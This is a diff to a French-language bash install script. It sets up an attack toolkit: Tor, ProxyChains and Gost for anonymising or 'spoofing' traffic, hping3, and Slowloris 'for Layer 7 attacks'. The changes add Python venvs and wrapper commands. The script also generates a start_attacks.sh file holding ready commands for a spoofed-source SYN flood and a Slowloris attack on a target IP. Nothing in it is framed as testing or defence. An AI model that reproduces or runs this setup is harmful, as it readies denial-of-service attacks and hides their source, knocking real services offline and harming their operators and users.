@@ -12,7 +12,7 @@ echo ""
 apt update && apt upgrade -y
 
 # Installation des dépendances
-apt install -y curl wget git python3 python3-pip build-essential libssl-dev libffi-dev python3-dev openjdk-11-jdk
+apt install -y curl wget git python3 python3-pip python3-venv build-essential libssl-dev libffi-dev python3-dev openjdk-11-jdk
 
 # Installation de Tor pour le spoofing
 apt install -y tor
@@ -124,6 +124,7 @@ else
 fi
 
 # Installation de Cloudflare-Speedtest
+echo "Installation de CloudflareSpeedtest avec venv..."
 if [ -d "/opt/CloudflareSpeedtest" ]; then
     rm -rf /opt/CloudflareSpeedtest
 fi
@@ -132,12 +133,20 @@ if [ -d "CloudflareSpeedtest" ]; then
 fi
 git clone https://github.com/XIU2/CloudflareSpeedtest.git /opt/CloudflareSpeedtest
 cd /opt/CloudflareSpeedtest
+# Création de l'environnement virtuel
+python3 -m venv venv
+source venv/bin/activate
+# Mise à jour de pip dans le venv
+pip install --upgrade pip
+# Installation des dépendances
 if [ -f "requirements.txt" ]; then
-    pip3 install -r requirements.txt || pip3 install cloudscraper requests
+    pip install -r requirements.txt || pip install cloudscraper requests
 else
-    pip3 install cloudscraper requests
+    pip install cloudscraper requests
 fi
+deactivate
 cd "$SCRIPT_DIR"
+echo "✓ CloudflareSpeedtest installé avec venv"
 
 # Installation de Ubooquity
 echo "Installation de Ubooquity..."
@@ -181,6 +190,7 @@ systemctl restart nginx
 apt install -y hping3
 
 # Installation de Slowloris pour les attaques Layer 7
+echo "Installation de Slowloris avec venv..."
 if [ -d "/opt/slowloris" ]; then
     rm -rf /opt/slowloris
 fi
@@ -189,10 +199,18 @@ if [ -d "slowloris" ]; then
 fi
 git clone https://github.com/gkbrk/slowloris.git /opt/slowloris
 cd /opt/slowloris
+# Création de l'environnement virtuel
+python3 -m venv venv
+source venv/bin/activate
+# Mise à jour de pip dans le venv
+pip install --upgrade pip
+# Installation des dépendances
 if [ -f "requirements.txt" ]; then
-    pip3 install -r requirements.txt
+    pip install -r requirements.txt
 fi
+deactivate
 cd "$SCRIPT_DIR"
+echo "✓ Slowloris installé avec venv"
 
 # Script pour lancer les attaques
 cat <<EOF > /usr/local/bin/start_attacks.sh
@@ -201,12 +219,41 @@ cat <<EOF > /usr/local/bin/start_attacks.sh
 # Exemple d'utilisation de Hping3 pour une attaque SYN Flood
 # hping3 -S -p 80 -i u10000 -a 192.168.1.1 target_ip
 
-# Exemple d'utilisation de Slowloris pour une attaque Layer 7
-# cd /opt/slowloris && python3 slowloris.py target_ip
+# Exemple d'utilisation de Slowloris pour une attaque Layer 7 (avec venv)
+# cd /opt/slowloris && source venv/bin/activate && python3 slowloris.py target_ip && deactivate
+
+# Exemple d'utilisation de CloudflareSpeedtest (avec venv)
+# cd /opt/CloudflareSpeedtest && source venv/bin/activate && python3 cfst.py [options] && deactivate
 
 # Remplacez target_ip par l'adresse IP de la cible
 echo "Script d'attaque - Modifiez ce script avec votre cible avant utilisation"
+echo ""
+echo "Pour utiliser Slowloris avec venv:"
+echo "  cd /opt/slowloris && source venv/bin/activate && python3 slowloris.py target_ip"
+echo ""
+echo "Pour utiliser CloudflareSpeedtest avec venv:"
+echo "  cd /opt/CloudflareSpeedtest && source venv/bin/activate && python3 cfst.py [options]"
 EOF
+
+# Création d'un wrapper pour slowloris avec venv
+cat <<EOF > /usr/local/bin/slowloris
+#!/bin/bash
+cd /opt/slowloris
+source venv/bin/activate
+python3 slowloris.py "\$@"
+deactivate
+EOF
+chmod +x /usr/local/bin/slowloris
+
+# Création d'un wrapper pour CloudflareSpeedtest avec venv
+cat <<EOF > /usr/local/bin/cloudflarespeedtest
+#!/bin/bash
+cd /opt/CloudflareSpeedtest
+source venv/bin/activate
+python3 cfst.py "\$@"
+deactivate
+EOF
+chmod +x /usr/local/bin/cloudflarespeedtest
 
 # Rendre le script exécutable
 chmod +x /usr/local/bin/start_attacks.sh
@@ -218,12 +265,20 @@ echo "Outils installés :"
 echo "  - Tor: /usr/bin/tor"
 echo "  - ProxyChains: /usr/bin/proxychains4"
 echo "  - Gost: /usr/local/bin/gost (démarré en arrière-plan)"
-echo "  - CloudflareSpeedtest: /opt/CloudflareSpeedtest"
-echo "  - Slowloris: /opt/slowloris"
+echo "  - CloudflareSpeedtest: /opt/CloudflareSpeedtest (avec venv)"
+echo "  - Slowloris: /opt/slowloris (avec venv)"
 echo "  - Hping3: /usr/bin/hping3"
 echo "  - Nginx: /etc/nginx"
 echo ""
+echo "Wrappers disponibles (utilisent automatiquement les venvs) :"
+echo "  - slowloris: /usr/local/bin/slowloris"
+echo "  - cloudflarespeedtest: /usr/local/bin/cloudflarespeedtest"
+echo ""
 echo "Scripts disponibles :"
 echo "  - Attaques: /usr/local/bin/start_attacks.sh"
+echo ""
+echo "Utilisation des outils Python :"
+echo "  - Utilisez les wrappers: slowloris target_ip"
+echo "  - Ou manuellement: cd /opt/slowloris && source venv/bin/activate && python3 slowloris.py target_ip"
 echo ""
 echo "Pour nettoyer l'installation, exécutez : ./cleanup-spoof.sh"
